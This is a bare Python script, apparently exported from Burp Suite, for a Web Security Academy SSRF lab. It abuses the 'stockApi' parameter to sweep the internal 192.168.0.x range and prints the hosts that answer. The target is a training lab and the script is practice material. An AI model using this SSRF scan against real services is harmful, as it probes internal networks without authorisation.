import requests

burp0_url = "https://acbd1fdc1ee35920c06429e900100004.web-security-academy.net:443/product/stock"
burp0_cookies = {"session": "gei32cCHXDVKNPEuNBlXIRbmyeOoW75G"}
burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", "Referer": "https://acbd1fdc1ee35920c06429e900100004.web-security-academy.net/product?productId=1", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://acbd1fdc1ee35920c06429e900100004.web-security-academy.net", "Dnt": "1", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin", "Sec-Gpc": "1", "Te": "trailers", "Connection": "close"}



for i in range (255,0,-1):
    payload = "http://192.168.0." + str(i) + ":8080/product/stock/check?productId=1&storeId=1"
    burp0_data = {"stockApi": payload}

    response = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)

    if response.status_code == 200:
        print(i)